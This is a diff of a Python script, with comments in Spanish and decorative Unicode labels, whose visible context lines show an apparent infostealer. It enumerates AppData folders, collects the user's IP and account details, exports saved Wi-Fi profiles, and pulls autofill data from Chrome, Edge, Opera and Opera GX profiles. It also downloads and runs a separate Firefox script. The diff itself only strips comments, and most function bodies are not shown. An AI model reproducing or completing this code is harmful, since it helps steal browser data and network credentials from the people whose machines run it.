@@ -40,11 +40,6 @@ import pywifi
 import os
 import subprocess
 
-# Aquí va el resto de tu código
-
-
-#SOURCES
-
 intro = """
 ╔════════════════════════════════════════════════╗
 
@@ -83,9 +78,6 @@ if not os.path.exists(app_data_folder):
 browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬")
 
 
-
-# ROAMING FOLDER
-
 folder_roaming = [name for name in os.listdir(roaming) if os.path.isdir(os.path.join(roaming, name))]
 
 total_roaming = len(folder_roaming)
@@ -102,7 +94,6 @@ with open(roaming_txt, "w", encoding="utf-8") as archive:
     archive.write(robmo)
     archive.write(f"𝚃𝚘𝚝𝚊𝚕 𝙵𝚘𝚕𝚍𝚎𝚛𝚜: {total_roaming}")
 
-# LOCAL FOLDER 𝐋𝐨𝐜𝐚𝐥 𝐀𝐩𝐩𝐝𝐚𝐭𝐚 𝐑𝐨𝐚𝐦𝐢𝐧𝐠 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨 𝐋𝐨𝐜𝐚𝐥 𝐀𝐩𝐩𝐝𝐚𝐭𝐚 𝐑𝐨𝐚𝐦𝐢𝐧𝐠 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨 𝐔𝐬𝐞𝐫𝟏
 
 folder_local = [name for name in os.listdir(local) if os.path.isdir(os.path.join(local, name))]
 
@@ -120,7 +111,6 @@ with open(local_txt, "w", encoding="utf-8") as archive:
     archive.write(robmo)
     archive.write(f"𝚃𝚘𝚝𝚊𝚕 𝙵𝚘𝚕𝚍𝚎𝚛𝚜: {total_local}")
 
-#USER INFO
 
 def getip():
     ip = "None"
@@ -157,7 +147,6 @@ def ginfo():
         file.write(intro.strip() + "\n" + robmo  + user_info)
 ginfo()
 
-#BROWSERS
 
 def browser_txt(user_folder, browser_list):
     browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬")
@@ -295,7 +284,6 @@ def installed_browsers():
         if os.path.exists(browsers[x]):
             available.append(x)
     return available
-############
 
 def create_wifi_folder(user_folder):
     wifi_folder = os.path.join(user_folder, "𝐖𝐢-𝐟𝐢")
@@ -321,7 +309,6 @@ result = export_wifi_profiles(wifi_folder)
 if result:
     os.remove(os.path.join(wifi_folder, "output.txt"))
 
-#######
 
 chrome = {
     '𝐂𝐡𝐫𝐨𝐦𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
@@ -367,7 +354,6 @@ def get_autofill_data(browser_name, browser_path):
     
 for browser_name, browser_path in chrome.items():
     get_autofill_data(browser_name, browser_path)
-#######
 
 edge = {
     '𝐄𝐝𝐠𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
@@ -413,7 +399,7 @@ def get_auto_data(browser_name, browser_path):
     
 for browser_name, browser_path in edge.items():
     get_auto_data(browser_name, browser_path)
-######
+
 
 opera = {
     '𝐎𝐩𝐞𝐫𝐚': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable")
@@ -535,7 +521,6 @@ def opera1():
         
 
 opera1()
-#######
 
 operagx = {
     '𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
@@ -657,7 +642,6 @@ def main():
             
 if __name__ == "__main__":
     main()  
-#######
 
 
 user = os.path.expanduser("~")
@@ -725,8 +709,6 @@ def execute_firefox_script():
 download_firefox_script(user)
 
 execute_firefox_script()
-
-######
 
 if __name__ == '__main__':
     available_browsers = installed_browsers()
